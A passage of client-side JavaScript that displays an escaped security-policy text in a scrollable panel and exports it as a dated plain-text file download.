            <button class="btn-hack" onclick="_exportPolicyText()">EXPORT AS TEXT FILE</button>
        </div>
        <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:6px;padding:20px;max-height:600px;overflow-y:auto">
            <pre id="policy-text-content" style="white-space:pre-wrap;font-size:11px;line-height:1.6;color:var(--text-primary)">${_esc(policyText)}</pre>
        </div>
    `;

    el.scrollIntoView({ behavior: 'smooth', block: 'start' });
}

function _exportPolicyText() {
    const text = document.getElementById('policy-text-content').textContent;
    const blob = new Blob([text], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'security-policy-' + new Date().toISOString().substring(0,10) + '.txt';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}
